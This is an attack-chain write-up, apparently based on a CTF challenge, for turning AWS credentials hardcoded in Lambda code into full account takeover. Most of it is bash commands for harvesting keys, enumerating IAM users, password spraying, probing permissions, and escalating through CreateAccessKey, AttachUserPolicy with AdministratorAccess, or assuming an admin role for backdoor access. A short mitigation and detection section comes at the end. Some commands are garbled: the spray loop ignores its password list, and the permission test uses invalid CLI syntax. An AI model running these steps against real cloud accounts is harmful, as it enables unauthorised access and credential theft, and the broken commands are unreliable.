# AWS Credential Extraction to IAM User Spraying to Privilege Escalation

## Chain Summary
**Entry Point:** AWS access key ID exposed in Lambda code or environment  
**Severity:** High  
**Source:** https://kabinet.gitbook.io/ctf-writeup/2025/thuderdome/jaeger

Exploits hardcoded AWS credentials in Lambda function code or environment variables, uses the credentials to discover active IAM users via access key last-used timestamps, performs password spray against discovered users, and leverages valid credentials for privilege escalation via IAM permission abuse (CreateAccessKey, DeleteAccessKey, or assume higher-role).

---

## Chain: Hardcoded Access Key Discovery → IAM User Enumeration → Credential Spray → PrivEsc

### [1] Hardcoded AWS Credential Discovery in Lambda Code
- **Trigger:** Lambda function accessible (source code download, environment leak, code repository exposure); credentials embedded in code or env vars
- **Prereq:** AWS Lambda source code accessible (via Lambda console, git repo, S3 bucket, or config file leak); grep/search tools available
- **Method:**
  ```bash
  # Approach 1: Lambda console or downloaded function
  # Lambda functions often have AKIA (AWS access key ID) hardcoded
  grep -r "AKIA" ./lambda_source/ 2>/dev/null
  grep -r "aws_access_key_id" ./lambda_source/ 2>/dev/null
  grep -r "AWS_SECRET_ACCESS_KEY" ./lambda_source/ 2>/dev/null
  
  # Approach 2: Environment variables
  aws lambda get-function-configuration --function-name <FUNCTION_NAME> \
    --query 'Environment.Variables' --output json | jq . > env_vars.json
  
  cat env_vars.json | jq 'to_entries[] | select(.value | contains("AKIA") or contains("SECRET"))'
  
  # Approach 3: Git history / code repository
  git log -p --all -S 'AKIA' | grep -A5 -B5 'AKIA' > hardcoded_keys.txt
  grep -E 'AKIA[0-9A-Z]{16}' hardcoded_keys.txt | sort -u
  ```
- **Yields:** Hardcoded AWS access key ID and possibly secret access key (or plaintext secret in config)

### [2] AWS CLI Configuration with Extracted Credentials
- **Trigger:** Access key ID obtained; need to activate for enumeration
- **Prereq:** AWS CLI installed; extracted access key ID and secret key (or just key ID for enumeration)
- **Method:**
  ```bash
  # Configure AWS CLI with extracted credentials
  export AWS_ACCESS_KEY_ID="AKIA<remaining_key>"
  export AWS_SECRET_ACCESS_KEY="<extracted_secret>"
  export AWS_DEFAULT_REGION="us-east-1"
  
  # Or add to ~/.aws/credentials
  cat >> ~/.aws/credentials <<EOF
  [extracted]
  aws_access_key_id = AKIA<key>
  aws_secret_access_key = <secret>
  EOF
  
  # Verify identity
  aws sts get-caller-identity
  # Returns: Account ID, UserId, ARN (e.g., AIDACKCEVSQ6C7EXMPLE)
  ```
- **Yields:** Authenticated AWS context; AWS account ID; IAM user ID (to correlate with enumeration)

### [3] IAM Access Key Last-Used Enumeration (Username Discovery)
- **Trigger:** Access key ID confirmed valid; need to enumerate IAM users to build spray target list
- **Prereq:** AWS credentials configured; IAM read permissions (typically required); access key ID from extracted creds
- **Method:**
  ```bash
  # Method 1: Get IAM Access Key Last-Used Info
  # If the extracted credentials have IAM read perms, enumerate users
  aws iam list-users --query 'Users[*].[UserName, CreateDate, UserId]' --output table
  
  # Method 2: Get Access Key Last-Used (correlate access key to user)
  # If you only have access key ID, query the credential report
  aws iam get-credential-report > credential_report.csv
  
  # Parse credential report
  cat credential_report.csv | grep "AKIA" | cut -d, -f1,5,6,7 | sort -u
  # Columns: user, password_last_changed, password_next_rotation, mfa_active
  
  # Method 3: Direct enumeration (if permissions allow)
  # Test different username formats (often derived from email or common patterns)
  # Common patterns: firstname.lastname, firstnamelastname, firstname_lastname
  
  for user in $(cat potential_usernames.txt); do
    aws iam get-user --user-name "$user" 2>&1 | grep -q "NoSuchEntity" || echo "[+] VALID USER: $user"
  done
  ```
- **Yields:** List of valid IAM usernames; user creation dates; access key metadata; MFA status

### [4] Password Spray Against Discovered IAM Users
- **Trigger:** Valid IAM usernames obtained; need to find weak password accounts
- **Prereq:** IAM username list; password wordlist (rockyou.txt, custom org password list); boto3 or aws CLI for testing
- **Method:**
  ```bash
  # Method 1: AWS CLI / STS assume-role spray
  # (Requires a role that users can assume — often not available)
  
  # Method 2: Direct IAM user operations (if permissions allow)
  # Test by attempting iam:GetUser or iam:ListAccessKeys
  for user in $(cat discovered_users.txt); do
    for pass in $(head -1000 passwords.txt); do
      # Create temporary AWS credentials with username and password (unlikely to work via CLI)
      # Instead, attempt to update IAM user details (if current creds allow)
      
      # More viable: assume role as discovered user (if cross-account or cross-user role exists)
      aws sts assume-role --role-arn "arn:aws:iam::<ACCOUNT>:role/<ROLE>" \
        --role-session-name "$user-session" 2>&1 | grep -q "NotAuthorized" || echo "[+] VALID: $user"
    done
  done
  
  # Method 3: Web console spray (via boto3 + browser automation)
  # Less common but possible if console access is targeted
  # Spray console credentials via Selenium or similar tool
  
  # Method 4: Access Key Rotation Spray
  # If extracted creds belong to user with CreateAccessKey permission, test if we can:
  # 1. Create access key for another user (if we find their password)
  # 2. Delete old access keys to lock them out (denial of service)
  
  for user in $(cat discovered_users.txt); do
    # Attempt to create access key for user (if permissions allow)
    aws iam create-access-key --user-name "$user" 2>&1 | grep -q "AccessDenied" || \
      echo "[+] MAY BE VALID: Can create access key for $user"
  done
  ```
- **Yields:** Valid IAM user credentials (if weak password found) OR confirmation of privilege escalation vector (CreateAccessKey permission)

### [5] IAM Permission Bruteforcing & Privilege Escalation Paths
- **Trigger:** Extracted credentials confirmed; need to identify escalation opportunities
- **Prereq:** AWS credentials configured; knowledge of IAM actions; tools: aws CLI, enumerate-iam (script), or manual testing
- **Method:**
  ```bash
  # Method 1: Test dangerous IAM permissions
  for action in \
    "iam:CreateUser" \
    "iam:CreateAccessKey" \
    "iam:DeleteAccessKey" \
    "iam:AttachUserPolicy" \
    "iam:PutUserPolicy" \
    "iam:CreateRole" \
    "iam:AttachRolePolicy" \
    "iam:AssumeRole" \
    "iam:UpdateAssumeRolePolicy" \
    "sts:AssumeRole" \
    "ec2:*" \
    "s3:*" \
    "lambda:InvokeFunction" \
  ; do
    # Attempt the action (will fail if no permission, but error message differs)
    result=$(aws iam $action --user-name test 2>&1)
    if echo "$result" | grep -q "AccessDenied"; then
      echo "[-] No permission: $action"
    else
      echo "[+] POSSIBLE: $action"
    fi
  done
  
  # Method 2: Use enumerate-iam script
  # (Open-source tool for IAM permission enumeration)
  python3 enumerate-iam.py -k $AWS_ACCESS_KEY_ID -s $AWS_SECRET_ACCESS_KEY | tee iam_perms.txt
  
  # Method 3: Check for assume-role permissions
  aws iam list-roles --query 'Roles[*].[RoleName, AssumeRolePolicyDocument]' --output json | \
    jq -r '.[] | select(.AssumeRolePolicyDocument | contains("Service")) | .[0]'
  ```
- **Yields:** List of available IAM actions; identify privilege escalation vectors (CreateAccessKey, AttachUserPolicy, etc.)

### [6] Privilege Escalation (CreateAccessKey + AttachPolicy or Assume Higher Role)
- **Trigger:** Escalation vector identified; need to gain admin/full access
- **Prereq:** Extracted credentials have iam:CreateAccessKey or iam:AttachUserPolicy permission; target user/role identified
- **Method (CreateAccessKey + AttachPolicy):**
  ```bash
  # Step 1: Create new access key for current user or target user
  NEW_KEY=$(aws iam create-access-key --user-name $USER_NAME --output json)
  NEW_ACCESS_KEY=$(echo $NEW_KEY | jq -r '.AccessKey.AccessKeyId')
  NEW_SECRET_KEY=$(echo $NEW_KEY | jq -r '.AccessKey.SecretAccessKey')
  
  # Step 2: Attach AdministratorAccess policy to the user
  aws iam attach-user-policy --user-name $USER_NAME \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  
  # Step 3: Use new credentials for full account access
  export AWS_ACCESS_KEY_ID="$NEW_ACCESS_KEY"
  export AWS_SECRET_ACCESS_KEY="$NEW_SECRET_KEY"
  
  # Verify admin access
  aws iam list-users --query 'Users[*].UserName'
  ```

**Method (AssumeRole + Admin Role):**
  ```bash
  # List available roles (especially those trusting service principals or users)
  aws iam list-roles --query 'Roles[*].RoleName' --output text
  
  # Assume a high-privilege role (if trust policy allows)
  ROLE_ARN="arn:aws:iam::<ACCOUNT>:role/Admin-Role"
  
  CREDS=$(aws sts assume-role --role-arn $ROLE_ARN --role-session-name "escalation")
  
  # Extract temporary credentials
  TEMP_ACCESS=$(echo $CREDS | jq -r '.Credentials.AccessKeyId')
  TEMP_SECRET=$(echo $CREDS | jq -r '.Credentials.SecretAccessKey')
  TEMP_SESSION=$(echo $CREDS | jq -r '.Credentials.SessionToken')
  
  # Use temporary credentials
  export AWS_ACCESS_KEY_ID="$TEMP_ACCESS"
  export AWS_SECRET_ACCESS_KEY="$TEMP_SECRET"
  export AWS_SESSION_TOKEN="$TEMP_SESSION"
  
  # Confirm elevated access
  aws sts get-caller-identity  # Should show assumed role
  ```
- **Yields:** Administrator or elevated IAM credentials; full AWS account access; persistent backdoor access (if new key created)

---

## Mitigation & Detection

**Prevention:**
- **Secrets Management:** Never hardcode AWS credentials in Lambda code or environment variables
  - Use IAM roles for Lambda execution instead
  - Use AWS Secrets Manager or Parameter Store for secrets rotation
  - Scan code for secrets before committing (pre-commit hooks, CI/CD scanning)
- **Lambda Security:**
  - Grant minimal IAM permissions (principle of least privilege)
  - Use resource-based policies to restrict cross-account access
  - Disable public access to Lambda functions
  - Enable VPC execution to restrict outbound access
- **IAM Best Practices:**
  - Enforce MFA on all IAM users; disable console access for service accounts
  - Use temporary credentials via STS; disable long-lived access keys for humans
  - Restrict dangerous permissions: iam:CreateAccessKey, iam:AttachUserPolicy, iam:AssumeRole
  - Use Condition keys to restrict access to specific IP ranges, request times, or resources
  - Regularly audit and rotate access keys (quarterly max)
- **Monitoring & Detection:**
  - Use AWS IAM Access Analyzer to identify overpermissive roles
  - Enable CloudTrail for all API calls; alert on iam:CreateAccessKey, iam:AttachUserPolicy, sts:AssumeRole
  - Use AWS Config to detect misconfigured IAM policies
  - Implement credential rotation policies (auto-expire unused keys after 90 days)

**Detection:**
- **CloudTrail Logs:** Alert on:
  - `iam:CreateAccessKey` from unexpected principals or locations
  - `iam:AttachUserPolicy` / `iam:PutUserPolicy` actions (privilege escalation)
  - `sts:AssumeRole` with mismatched principal or source IP
  - Bulk `iam:GetUser` or `iam:ListUsers` calls (enumeration)
- **VPC Flow Logs:** Detect outbound connections to AWS APIs from unexpected sources
- **Lambda@Edge / WAF:** Monitor for hardcoded credentials in Lambda function source or environment
- **AWS Config Rules:** Custom rules to detect:
  - Access keys older than 90 days
  - IAM users without MFA
  - Overpermissive policy statements (wildcards)
  - Exposed secrets in environment variables

---

## References
- AWS IAM Best Practices: https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html
- Lambda Security: https://docs.aws.amazon.com/lambda/latest/dg/security.html
- Secrets Manager: https://docs.aws.amazon.com/secretsmanager/latest/userguide/
- CloudTrail: https://docs.aws.amazon.com/awscloudtrail/latest/userguide/
- enumerate-iam (GitHub): https://github.com/andresriancho/enumerate-iam
